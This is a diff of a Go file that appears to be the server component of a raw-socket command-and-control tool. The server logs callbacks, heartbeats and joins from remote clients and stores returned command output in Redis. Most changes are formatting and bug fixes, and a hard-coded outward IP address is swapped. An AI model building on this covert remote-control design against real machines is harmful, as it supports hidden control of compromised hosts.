@@ -1,19 +1,19 @@
 package main
 
 import (
+	"context"
 	"fmt"
 	"log"
 	"net"
-    "context"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
-	"regexp"
 
-	"github.com/google/gopacket"
 	"github.com/DaveTheBearMan/Keydra/socket"
-	"golang.org/x/sys/unix"
+	"github.com/google/gopacket"
 	"github.com/redis/go-redis/v9"
+	"golang.org/x/sys/unix"
 )
 
 // Global to store staged command
@@ -40,45 +40,45 @@ type Host struct {
 func writeClientData(streamKey string, command string, hostname string, data string) {
 	// Builds arguments for redis datastream
 	args := &redis.XAddArgs{
-        Stream: streamKey,
-        MaxLen: 500,
-        Approx: true,
-        Values: map[string]interface{}{
-            "command":  command,
-            "host": 	hostname,
-			"data":		data,
-            "time":   	time.Now().Format(time.RFC3339),
-        },
-    }
+		Stream: streamKey,
+		MaxLen: 500,
+		Approx: true,
+		Values: map[string]interface{}{
+			"command": command,
+			"host":    hostname,
+			"data":    data,
+			"time":    time.Now().Format(time.TimeOnly),
+		},
+	}
 
-	// Send to redis datastream 
+	// Send to redis datastream
 	_, err := rdb.XAdd(ctx, args).Result()
-    if err != nil {
-        log.Fatalf("XAdd failed: %v", err)
-    } else if verbose {
-		fmt.Println(streamKey + " " + event + " " + message)
+	if err != nil {
+		log.Fatalf("XAdd failed: %v", err)
+	} else if verbose {
+		fmt.Println(streamKey + " " + hostname + " " + data)
 	}
 }
 
 // Write host
-func writeLog(streamKey string, event string, message string, data string) {
+func writeLog(streamKey string, event string, message string) {
 	// Builds arguments for redis datastream
 	args := &redis.XAddArgs{
-        Stream: streamKey,
-        MaxLen: 500,
-        Approx: true,
-        Values: map[string]interface{}{
-            "event":   	event,
-            "message": 	message,
-            "time":   	time.Now().Format(time.RFC3339),
-        },
-    }
+		Stream: streamKey,
+		MaxLen: 500,
+		Approx: true,
+		Values: map[string]interface{}{
+			"event":   event,
+			"message": message,
+			"time":    time.Now().Format(time.TimeOnly),
+		},
+	}
 
-	// Send to redis datastream 
+	// Send to redis datastream
 	_, err := rdb.XAdd(ctx, args).Result()
-    if err != nil {
-        log.Fatalf("XAdd failed: %v", err)
-    } else if verbose {
+	if err != nil {
+		log.Fatalf("XAdd failed: %v", err)
+	} else if verbose {
 		fmt.Println(streamKey + " " + event + " " + message)
 	}
 }
@@ -148,16 +148,31 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	}
 
 	clientLogName := fmt.Sprintf("Client-%s", newHost.Hostname)
-	writeLog("Server", "TRAFFIC", fmt.Sprintf("Recieved From: %s (%s)", newHost.Hostname, newHost.IP))
+	writeLog("Server", "CALLBACK", fmt.Sprintf("%s : %s", newHost.Hostname, newHost.IP))
 
-	if payload[4] == "JOIN" {
-		writeLog(clientLogName, "JOIN", newHost.IP.String())
-	} else if payload[0] == "HEARTBEAT" {
+	// println(payload[0], payload[1], payload[2], payload[3])
+	// logType := payload[0][:len(payload[0])-1] // Remove : trailing colon
+	dataExists := len(payload) > 4
+
+	if payload[0] == "HEARTBEAT" {
 		writeLog(clientLogName, "HEARTBEAT", newHost.IP.String())
-	} else {
-		payloadData := strings.join(payload[5:], " ") // Reconstruct just the data
-		cmdIdSeqRegex, _ := regexp.Compile("(?<=\<CMD)(.*?)(?=END\>)") // Command Id Sequence Regex (Catch John from <CMDJohnEND>)
-		cmdId := cmdIdSeqRegex.MatchString(payloadData)
+	} else if dataExists && payload[4] == "JOIN" {
+		writeLog(clientLogName, "JOIN", "CONNECTION ACCEPTED")
+	} else if dataExists {
+		payloadData := strings.Join(payload[5:], " ") // Reconstruct just the data
+
+		// Compile regex once
+		cmdIdSeqRegex := regexp.MustCompile(`(?<=<CMD)(.*?)(?=END>)`)
+
+		// Extract the command ID
+		cmdId := cmdIdSeqRegex.FindString(payloadData)
+
+		// Handle missing ID gracefully
+		if cmdId == "" {
+			fmt.Println("Warning: no command ID found in payload:", payloadData)
+			return
+		}
+
 		writeClientData(clientLogName, cmdId, newHost.Hostname, payloadData)
 	}
 
@@ -166,7 +181,7 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 }
 
 // func listenRedisStream() {
-	
+
 // }
 
 func initializeRawSocketServer() {
@@ -177,13 +192,13 @@ func initializeRawSocketServer() {
 	readfd := socket.NewSocket()
 	defer unix.Close(readfd)
 
-	writeLog("Server", "DEBUG", fmt.Sprintf("Created sockets"))
+	writeLog("Server", "DEBUG", "Created sockets")
 
 	// Make channel buffer by 5
 	listen := make(chan Host, 10)
 
 	// Iface and myip for the sendcommand func to use
-	iface, myIP := socket.GetOutwardIface("157.245.141.117:80")
+	iface, myIP := socket.GetOutwardIface("129.21.21.67:80")
 	writeLog("Server", "DEBUG", fmt.Sprintf("Interface: %s", iface.Name))
 
 	dstMAC, err := socket.GetRouterMAC()
@@ -215,7 +230,7 @@ func main() {
 	verbose = false
 	rdb = redis.NewClient(&redis.Options{ // Connect to local redis database
 		Addr: "localhost:6379",
-	})	
+	})
 	go initializeRawSocketServer()
 
 	for {
@@ -231,8 +246,6 @@ func main() {
 		for _, stream := range streams {
 			for _, msg := range stream.Messages {
 				fmt.Printf("ID: %s, Values: %v\n", msg.ID, msg.Values)
-
-				msg.Values.
 			}
 		}
 	}
